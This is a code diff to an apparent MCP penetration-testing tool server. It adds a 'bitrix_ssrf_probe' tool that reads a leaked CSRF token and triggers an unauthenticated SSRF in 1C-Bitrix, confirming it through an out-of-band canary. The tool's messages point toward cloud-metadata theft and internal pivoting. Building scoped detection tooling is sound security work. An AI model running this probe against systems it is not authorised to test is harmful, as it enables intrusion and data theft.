@@ -101,6 +101,7 @@ from .web import appliance as appliancemod
 from .web import authflow as authflowmod
 from .web import authz as authzmod
 from .web import behavior as behaviormod
+from .web import bitrix as bitrixmod
 from .web import browser as browsermod
 from .web import cache_deception as cachedecmod
 from .web import cachepoison as cachepoisonmod
@@ -521,7 +522,7 @@ async def tool_catalog(family: str | None = None) -> dict:
 @safe_tool
 async def search_tools(query: str, limit: int = 6) -> dict:
     """**Find the few tools relevant to what you're doing** instead of scanning all
-    ~171. Give a keyword or phrase (`"graphql"`, `"jwt"`, `"cache poisoning"`,
+    ~172. Give a keyword or phrase (`"graphql"`, `"jwt"`, `"cache poisoning"`,
     `"subdomains"`) and get back a short ranked list — each with the tool name, its
     family, and a one-line gist — so you can pick the right probe without reading
     the whole catalogue. A name match outranks a family match outranks a gist
@@ -5643,6 +5644,54 @@ async def fastjson_oast_probe(target: str, method: str = "POST",
     else:
         out["detail"] = ("the endpoint resolved our benign @type canary — Fastjson/Jackson autoType "
                          "deserialization is reachable; hand gadget selection + the JNDI server to Strix")
+    return out
+
+
+@mcp.tool()
+@active_tool(intrusive=True)
+async def bitrix_ssrf_probe(target: str, oast_token: str | None = None, wait: float = 3.0) -> dict:
+    """**1C-Bitrix unauthenticated SSRF** (`html_editor_action.php`) — OAST-confirmed, detection-only.
+    Bitrix's `action=uploadfile` handler server-side **fetches** a caller-supplied `tmp_url`, and on
+    unpatched installs the CSRF `sessid` it needs is readable unauthenticated from
+    `composite_data.php` — so an anonymous request makes the box fetch any URL (SSRF). This reads
+    the `sessid`, then POSTs the benign `uploadfile` multipart with `tmp_url` set to an **OAST
+    canary**; a callback from the target confirms the SSRF with nothing extracted and no file
+    written. Start `oast_selfhost` / `oast_configure` first. Weaponizing the SSRF (cloud-metadata
+    theft, internal pivot) → `ssrf_metadata_probe` / Strix. Dominant in RU/CIS. Intrusive; in scope only.
+    """
+
+    raw = target.strip()
+    url = (raw if "://" in raw else f"https://{raw}").rstrip("/")
+    ctx = get_context()
+    cb = ctx.oast.get(oast_token) if oast_token else None
+    if cb is None:
+        if not ctx.oast.configured:
+            return errmod.err("oast_unconfigured",
+                              detail="start oast_selfhost or oast_configure before a Bitrix SSRF probe")
+        cb = ctx.oast.generate(label="bitrix_ssrf")
+
+    sc = _scope_check()
+    sess = await ctx.http.fetch(url + bitrixmod.COMPOSITE_DATA_PATH, follow_redirects=False, scope_check=sc)
+    sessid = bitrixmod.extract_sessid(sess.text(80_000)) if sess.status is not None else None
+    body, ct = bitrixmod.build_upload_multipart(sessid or "", cb.http_url)
+    r = await ctx.http.fetch(url + bitrixmod.HTML_EDITOR_PATH, method="POST", body=body,
+                             headers={"Content-Type": ct, "Bx-ajax": "true"},
+                             follow_redirects=False, scope_check=sc)
+    await asyncio.sleep(max(0.0, min(wait, 8.0)))
+    hits = await oastmod.collect_interactions(ctx, cb.token)
+    verdict = confirmmod.evaluate(oast_count=len(hits))
+    out = {"target": url, "canary": cb.http_url, "token": cb.token,
+           "sessid_leaked": bool(sessid), "endpoint_status": r.status, **verdict,
+           "interactions": hits[:20],
+           "suggested_next": nextstepmod.after("bitrix_ssrf_probe", verdict.get("verdict"))}
+    if hits:
+        out["detail"] = ("the target fetched our OAST canary via html_editor_action.php — "
+                         "unauthenticated Bitrix SSRF confirmed; escalate to cloud-metadata / internal "
+                         "reach with ssrf_metadata_probe / Strix")
+    else:
+        out["note"] = ("no callback yet — the install may be patched (sessid not leaked / upload "
+                       "handler rejects the fetch) or it calls back later; re-check with oast_poll"
+                       + ("" if sessid else " — composite_data.php did not leak a sessid"))
     return out
 
 
